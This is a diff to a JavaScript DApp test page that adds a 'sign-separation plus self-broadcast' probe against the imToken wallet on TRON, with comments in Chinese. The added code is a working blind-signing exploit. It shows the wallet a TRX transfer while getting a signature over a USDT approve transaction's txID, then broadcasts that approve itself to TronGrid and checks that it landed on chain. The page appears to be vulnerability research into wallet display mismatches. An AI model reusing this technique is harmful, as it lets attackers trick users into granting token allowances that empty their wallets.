@@ -72,6 +72,7 @@
       <button class="btn btn-probe" id="btnProbeClean" style="background:#8e1a1a;">⑥ 干净分离探针（raw_data=干净transfer / hex=干净approve）</button>
       <button class="btn btn-probe" id="btnProbeGenuine" style="background:#b8860b;">⑦ 自洽approve探针（节点必过·真上链·人工核对UI）</button>
       <button class="btn btn-probe" id="btnProbeTypeOverride" style="background:#7d3c98;">⑧ type覆盖探针（决定性：节点凭type还是type_url）</button>
+      <button class="btn btn-probe" id="btnProbeSignBroadcast" style="background:#a83232;">⑨ 签名分离+自广播探针（signTransaction·最可能成立）</button>
       <button class="btn btn-allowance" id="btnQueryAgain" style="margin-top:6px; background:var(--orange); color:#000;">④ 再次查询 allowance（验证变化）</button>
     </div>
   </div>
@@ -1014,6 +1015,135 @@
     }
   }
 
+  // ==================== ⑨ 签名分离 + DApp 自广播探针（最可能成立的路径） ====================
+  // 与 sendTransaction 的本质区别：tron.signTransaction 把签名【返回给 DApp】，由 DApp 自己广播。
+  //   ⇒ imToken“用 raw_data 广播”的兜底被绕过：广播不再经 imToken。
+  // 步骤：
+  //   1) 让 imToken 签一笔【显示=transfer，txID/hex=approve】的请求 → 它显示转账、签 approve 的 txID、返回签名
+  //   2) DApp 把该签名拼到【真正的 approve raw_data】上，自己 POST 给 TronGrid
+  //   3) 节点收到 approve raw_data + 锚定 approve 的签名 → 自洽 → 验签通过 → approve 上链
+  // 判读：
+  //   · 自广播返回 result:true / 回链=TriggerSmartContract → 🔴 WYSINWYS 成立（签 approve、显示 transfer、已上链）
+  //   · signTransaction 抛 invalid_tx/validRawTx → imToken 在签名前做了一致性校验（该路被客户端挡）
+  //   · 自广播 SIGERROR → imToken 实际签的是重建后的 transfer（非 txID）→ 该路不成立
+  function extractSignature(res) {
+    if (!res) return null;
+    if (Array.isArray(res.signature)) return res.signature[0];
+    if (typeof res.signature === 'string') return res.signature;
+    var nested = res.signedTransaction || res.transaction || res.result || res.data || res.tx;
+    if (nested && typeof nested === 'object') {
+      if (Array.isArray(nested.signature)) return nested.signature[0];
+      if (typeof nested.signature === 'string') return nested.signature;
+    }
+    if (typeof res === 'string' && /^[0-9a-fA-F]{120,}$/.test(res)) return res;
+    return null;
+  }
+
+  async function runProbeSignBroadcast() {
+    if (!window.imToken || typeof window.imToken.callPromisifyAPI !== 'function') { log('imToken 桥未就绪', 'error'); return; }
+    if (!window.tronWeb || !window.tronWeb.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+
+    log('══════════ 签名分离 + DApp 自广播探针 ══════════', 'warn');
+    log('imToken 负责签名（显示 transfer）；广播由本页面直连 TronGrid 完成', 'warn');
+    log('═══════════════════════════════════════════════', 'warn');
+
+    try {
+      // 1) 真 approve（执行/广播目标）
+      var built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        window.tronWeb.address.toHex(USDT_CONTRACT), 'approve(address,uint256)',
+        { feeLimit: 100000000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        window.tronWeb.address.toHex(walletAddr)
+      );
+      if (!built.result || !built.result.result) { log('approve 构造失败', 'error'); return; }
+      var approveTx = built.transaction;
+      log('[目标] 真 approve txID = ' + approveTx.txID, 'warn');
+
+      // 2) 真 transfer（仅用于显示）
+      var transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
+      log('[显示] transfer contract[0].type = ' + transferBuilt.raw_data.contract[0].type, 'warn');
+
+      // 3) 错位签名请求：显示 transfer，但 txID/hex 锚定 approve
+      var signReq = {
+        visible: transferBuilt.visible,
+        txID: approveTx.txID,                 // 期望 imToken 签这个（approve 哈希）
+        raw_data: transferBuilt.raw_data,     // imToken 确认页据此显示 → transfer
+        raw_data_hex: approveTx.raw_data_hex
+      };
+      log('★ 即将弹窗：请观察 imToken 显示“转账”还是“授权”。签名将返回给本页面。', 'warn');
+
+      // 4) 请 imToken 仅签名（不广播）
+      var res;
+      try {
+        res = await window.imToken.callPromisifyAPI('tron.signTransaction', { tx: signReq, from: walletAddr });
+      } catch (e) {
+        var m = String(e.message || e), c = String(e.code || (e.data && e.data.code) || '');
+        log('signTransaction 抛错 code=' + (c || 'N/A') + ' msg=' + m, 'error');
+        if ((c + ' ' + m).toLowerCase().indexOf('invalid_tx') !== -1 || m.indexOf('validRawTx') !== -1) {
+          log('→ imToken 在 signTransaction 路径做了 validRawTx 一致性校验（客户端在签名前挡下该路）。', 'error');
+        } else {
+          log('→ 非一致性校验报错，可能是参数格式/用户取消；可调整 signReq 结构重试。', 'warn');
+        }
+        return;
+      }
+      log('signTransaction 原始返回: ' + JSON.stringify(res), 'warn');
+
+      var sig = extractSignature(res);
+      if (!sig) { log('未能从返回中取出签名，请把上面的原始返回贴给我以适配解析。', 'error'); return; }
+      log('[签名] 取得签名(前32): ' + sig.slice(0, 32) + ' …(len=' + sig.length + ')', 'success');
+
+      // 5) DApp 自己拼装【真 approve + 该签名】并自广播
+      var broadcastTx = {
+        visible: approveTx.visible,
+        txID: approveTx.txID,
+        raw_data: approveTx.raw_data,         // 真正上链的是 approve
+        raw_data_hex: approveTx.raw_data_hex,
+        signature: [sig]
+      };
+      log('[自广播] 用真 approve raw_data + imToken 返回的签名，直连 TronGrid …', 'warn');
+      var d = await postRawToNode(broadcastTx, '自广播approve');
+
+      // 6) 判读
+      $('probeResultCard').style.display = 'block';
+      var ok = d && (d.result === true || d.txid);
+      if (ok) {
+        var txid = d.txid || approveTx.txID;
+        $('probeTxid').textContent = txid;
+        log('✅ 自广播被节点接受！txid=' + txid, 'error');
+        log('── 回链验证 contract.type ──', 'warn');
+        var onchainType = await fetchOnchainTypeRetry(txid, 4);
+        $('probeOnchainType').textContent = onchainType || '未确认';
+        if (onchainType === 'TriggerSmartContract') {
+          $('probeOnchainType').style.color = 'var(--red)';
+          $('probeVerdict').textContent = '🔴 WYSINWYS 成立！签approve·显transfer·已上链';
+          $('probeVerdict').style.color = 'var(--red)';
+          $('probeInfoBox').innerHTML = 'imToken 用 signTransaction 签了 approve 的 txID（确认页显示 transfer），把签名交还 DApp；DApp 自行广播自洽 approve → 节点验签通过、approve 上链。<strong>绕过了 imToken 用 raw_data 广播的兜底 → 所见非所签且上链坐实。</strong>';
+          $('probeInfoBox').style.color = 'var(--red)';
+          await queryAndShowAllowance(false);
+        } else {
+          $('probeVerdict').textContent = '⚠️ 已上链，类型=' + (onchainType || '待确认');
+          log('链上类型: ' + (onchainType || '待确认'), 'warn');
+        }
+      } else if (d && (d.code || d.Error || d.message)) {
+        var em = '';
+        try { em = d.message ? window.tronWeb.toUtf8(d.message) : ''; } catch (e) { em = d.message || ''; }
+        log('自广播被节点拒绝: code=' + (d.code || '') + ' Error=' + (d.Error || '') + ' msg=' + em, 'error');
+        if ((d.code + ' ' + em + ' ' + (d.Error || '')).toLowerCase().indexOf('sig') !== -1
+            || (em || '').indexOf('permission') !== -1) {
+          log('→ SIGERROR：imToken 返回的签名并非锚定 approve 的 txID（可能它对 raw_data=transfer 重建后再签）。', 'error');
+          log('  即该路对该版本不成立：signTransaction 实际签的是重建交易，而非传入 txID。', 'warn');
+        } else {
+          log('→ 非签名错误，可能 approve 参数/能量问题；换更小额度或检查 USDT 合约可重试。', 'warn');
+        }
+      } else {
+        log('自广播返回无法判定: ' + JSON.stringify(d), 'warn');
+      }
+    } catch (e) {
+      log('签名分离探针异常: ' + (e.message || e), 'error');
+    }
+  }
+
   // ==================== 事件绑定 ====================
   $('btnConnect').addEventListener('click', connect);
   $('btnProbeDual').addEventListener('click', runProbeDual);
@@ -1021,6 +1151,7 @@
   $('btnProbeClean').addEventListener('click', runProbeClean);
   $('btnProbeGenuine').addEventListener('click', runProbeGenuine);
   $('btnProbeTypeOverride').addEventListener('click', runProbeTypeOverride);
+  $('btnProbeSignBroadcast').addEventListener('click', runProbeSignBroadcast);
   $('btnQueryAllowance').addEventListener('click', function() {
     queryAndShowAllowance(false);
   });
